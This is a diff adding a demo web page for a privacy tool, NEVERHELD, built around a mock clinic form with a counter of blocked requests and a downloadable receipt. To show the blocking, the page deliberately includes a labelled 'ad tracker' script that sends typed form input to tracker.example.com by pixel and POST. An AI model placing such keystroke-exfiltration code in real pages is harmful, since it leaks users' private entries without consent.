@@ -1,0 +1,116 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Try NEVERHELD: a locked page in one minute</title>
+<style>
+:root{--ink:#14202b;--muted:#5a6878;--brand:#0f6b55;--soft:#eef6f3;--line:#dde5ec;--red:#b42318;--amber:#9a6700}
+*{box-sizing:border-box}body{margin:0;font:17px/1.6 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;color:var(--ink);background:#f7fafb}
+a{color:var(--brand)}
+.top{background:#fff;border-bottom:1px solid var(--line)}.top .in{max-width:1080px;margin:0 auto;padding:14px 22px;display:flex;justify-content:space-between;align-items:center}
+.logo{font-weight:800;letter-spacing:.08em;text-decoration:none;color:var(--ink)}.logo span{color:var(--brand)}
+main{max-width:1080px;margin:0 auto;padding:28px 22px;display:grid;grid-template-columns:1.1fr .9fr;gap:24px}
+@media(max-width:860px){main{grid-template-columns:1fr}}
+h1{font-size:clamp(26px,3.4vw,34px);margin:0 0 6px}.sub{color:var(--muted);margin:0 0 18px}
+.card{background:#fff;border:1px solid var(--line);border-radius:16px;padding:22px}
+label{display:block;font-weight:600;margin:14px 0 6px}
+input[type=text],textarea{width:100%;padding:12px;font:inherit;border:1px solid #b8c4ce;border-radius:10px}
+.note{font-size:14px;color:var(--muted)}
+.status{display:flex;align-items:center;gap:10px;font-weight:800;font-size:20px;margin-bottom:14px}
+.dot{width:14px;height:14px;border-radius:50%;background:var(--amber)}.locked .dot{background:var(--brand)}.failed .dot{background:var(--red)}
+.counters{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:16px}
+.counter{background:var(--soft);border-radius:12px;padding:14px;text-align:center}
+.counter b{display:block;font-size:42px;line-height:1.1}.counter span{font-size:14px;color:var(--muted)}
+.counter.blocked{background:#fff4e5}
+ol.checklist{padding-left:0;list-style:none;margin:0 0 16px}
+ol.checklist li{padding:8px 0 8px 34px;position:relative;border-bottom:1px solid var(--line)}
+ol.checklist li::before{content:attr(data-n);position:absolute;left:0;top:7px;width:24px;height:24px;border-radius:50%;background:#e6eef5;color:#33465a;font-size:13px;font-weight:700;display:grid;place-items:center}
+ol.checklist li.done::before{content:"✓";background:var(--brand);color:#fff}
+button{font:inherit;font-weight:700;padding:12px 16px;border-radius:10px;border:0;background:var(--brand);color:#fff;cursor:pointer;width:100%;margin-top:6px}
+button:disabled{background:#a9b7c2;cursor:not-allowed}
+.result{margin-top:12px;padding:12px;border-radius:10px;background:var(--soft);display:none}
+.result.show{display:block}.result.bad{background:#fdecea}
+details{margin-top:14px;font-size:15px}
+</style>
+</head>
+<body>
+<div class="top"><div class="in"><a class="logo" href="/">NEVER<span>HELD</span></a><a href="/">Back to overview</a></div></div>
+<main>
+<section>
+<h1>Type something private. Watch it stay put.</h1>
+<p class="sub">This pretend clinic form has a hidden "ad tracker" on it, just like many real websites. It tries to send every word you type. NEVERHELD has locked the page.</p>
+<div class="card">
+<label for="symptoms">What brings you in today?</label>
+<textarea id="symptoms" rows="4" placeholder="e.g. chest pain since Tuesday"></textarea>
+<label for="name">Your name (anything works, nothing is stored)</label>
+<input id="name" type="text" autocomplete="off">
+<label for="file">Attach a document (optional: it is fingerprinted in your browser, never uploaded)</label>
+<input id="file" type="file">
+<p class="note">Demo only. Nothing you type leaves this page.</p>
+</div>
+</section>
+
+<aside class="card" id="panel">
+<div class="status" id="status"><span class="dot"></span><span id="statusText">Locking the page…</span></div>
+<div class="counters">
+<div class="counter"><b id="sent">0</b><span>things sent out</span></div>
+<div class="counter blocked"><b id="blocked">0</b><span>attempts blocked</span></div>
+</div>
+<ol class="checklist">
+<li id="c1" data-n="1">The page is locked</li>
+<li id="c2" data-n="2">Type in the form: the tracker tries to send it</li>
+<li id="c3" data-n="3">Get your receipt</li>
+<li id="c4" data-n="4">Check the receipt</li>
+</ol>
+<button id="receipt" disabled>Download my receipt</button>
+<button id="check" disabled>Check my receipt now</button>
+<div class="result" id="result"></div>
+<details><summary>Check it a second way, on any computer</summary><p>Open the <a href="/verify.html" target="_blank" rel="noopener">receipt checker</a> (it works offline too) and choose the receipt file you downloaded. Change one letter in the file and check again: it fails.</p></details>
+</aside>
+</main>
+
+<script>
+// The pretend "ad tracker": the kind of hidden third-party tag found on many real sites.
+document.addEventListener("input", function (event) {
+  var value = encodeURIComponent((event.target && event.target.value || "").slice(-40));
+  new Image().src = "https://tracker.example.com/pixel.gif?q=" + value;
+  try { fetch("https://tracker.example.com/collect", { method: "POST", body: value }).catch(function () {}); } catch (e) {}
+});
+</script>
+<script src="/neverheld.min.js"></script>
+<script>
+(function () {
+  var N = window.Neverheld, $ = function (id) { return document.getElementById(id); };
+  var app = { name: "NEVERHELD public demo", version: "0.3.2", commit: "demo" };
+  var workers = { declaration: "none", description: "This demo page starts no background workers." };
+  var proof = null, typed = false;
+  N.observeWorkers(); N.observeConnections(); N.observeFileInputs();
+  document.addEventListener("input", function () { typed = true; });
+  N.subscribeToSeal(function (s) {
+    $("sent").textContent = s.requests; $("blocked").textContent = s.blocked + s.guardBlocked;
+    var panel = $("status");
+    if (s.state === "sealed") { panel.className = "status locked"; $("statusText").textContent = "Page locked"; $("c1").className = "done"; $("receipt").disabled = false; }
+    if (s.state === "failed") { panel.className = "status failed"; $("statusText").textContent = "This browser could not lock the page"; }
+    if (typed && s.blocked > 0) $("c2").className = "done";
+  });
+  function start() { N.sealPage().catch(function () {}); }
+  if (document.readyState === "complete") start(); else window.addEventListener("load", start, { once: true });
+  $("receipt").addEventListener("click", async function () {
+    proof = await N.buildProof({ status: N.getSealStatus(), files: await N.recordedFiles(), observedFiles: true, application: app, release: { id: "neverheld-0.3.2-demo", manifestSha256: null, manifestFiles: null }, workers: workers });
+    var url = URL.createObjectURL(new Blob([N.proofJson(proof)], { type: "application/json" }));
+    var a = document.createElement("a"); a.href = url; a.download = "NEVERHELD-receipt.json"; document.body.appendChild(a); a.click(); a.remove();
+    $("c3").className = "done"; $("check").disabled = false;
+  });
+  $("check").addEventListener("click", async function () {
+    var r = await N.verifyProof(JSON.parse(N.proofJson(proof)));
+    var box = $("result"); box.className = "result show" + (r.valid ? "" : " bad");
+    var s = proof.body.seal;
+    box.innerHTML = r.valid
+      ? "<b>Receipt checks out.</b> Locked at " + s.sealedAt.slice(11, 19) + " UTC. Things sent out: " + s.pageRequestsSinceSealing + ". Attempts blocked: " + (s.blockedAttemptsSinceSealing + s.pageGuardBlockedSinceSealing) + ". Files fingerprinted: " + proof.body.files.length + ".<br><span class='note'>The receipt is written by the page itself: strong evidence, not an independent audit.</span>"
+      : "<b>This receipt does not check out.</b>";
+    $("c4").className = "done";
+  });
+})();
+</script>
+</body>
+</html>
